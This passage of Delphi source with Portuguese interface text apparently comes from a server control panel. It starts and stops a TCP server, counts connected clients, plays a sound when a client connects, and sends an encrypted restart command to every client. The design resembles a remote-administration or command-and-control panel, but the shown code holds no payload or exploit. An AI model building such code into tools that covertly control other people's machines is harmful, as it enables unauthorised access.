      except
        showmessage(IntToStr(SRVX.Port));
      end;
    end;

    if SRV.Active = True then
    begin
      btnLigarSrv.Caption := 'Servidor ON';
      btnLigarSrv.Font.Color := clGreen;
      Panel2.Caption := 'Total de Clientes Conectados: ' + IntToStr(Total);
      PITCPIP.Active := True;
      btnSessao.Visible := True;
      btnRecAll.Visible := True;
    end;
  end
  else
  begin
    if btnLigarSrv.Caption = 'Servidor ON' then
    begin

      SRV.Close;
      btnLigarSrv.Caption := 'Servidor OFF';
      btnLigarSrv.Font.Color := clRed;
      FCPrin.Panel2.Caption := '';
      Total := 0;
      btnSessao.Visible := false;
      btnRecAll.Visible := false;
      PITCPIP.Active := false;
      LV1.GridLines := false;
      LV1.Color := clSilver;
    end;

  end;

end;

procedure TFCPrin.btnMinimizeClick(Sender: TObject);
begin
  Application.Minimize;
end;

procedure TFCPrin.btnRecAllClick(Sender: TObject);
var
  I: Integer;
  Socket: TCustomWinSocket;
  L: TListItem;

begin
  if LV1.ItemIndex < 0 then
  begin
    Application.MessageBox('Não Existe Conexções ativas', 'Aviso', 0 + 48);
    exit;
  end;
  try
    if MessageBox(Handle, 'Gostaria de reiniciar todas conexções ativas ?',
      'Alerta', mb_yesno + mb_defbutton1 + 48) = mryes then
    begin
      for I := 0 to LV1.Items.Count - 1 do
      begin
        Socket := TCustomWinSocket(LV1.Items.Item[I].SubItems.Objects[0]);
        Socket.SendText(FCarga.vDc_vCri('C', '#OF-ALL#'));
      end;
    end;
  except
  end;

end;

procedure TrataSom.Execute;
begin
  Synchronize(TocaSom);
end;

procedure TrataSom.TocaSom;
begin
  with FCPrin do
  begin
    Channel := BASS_StreamCreateFile(false,
      PChar(ExtractFilePath(Application.ExeName) +
      'PlayList\entrada.mp3'), 0, 0, 0
{$IFDEF UNICODE} or BASS_UNICODE {$ENDIF});
    BASS_ChannelPlay(Channel, false);
  end;
end;
{ TSock_Thread_Instal }

end.
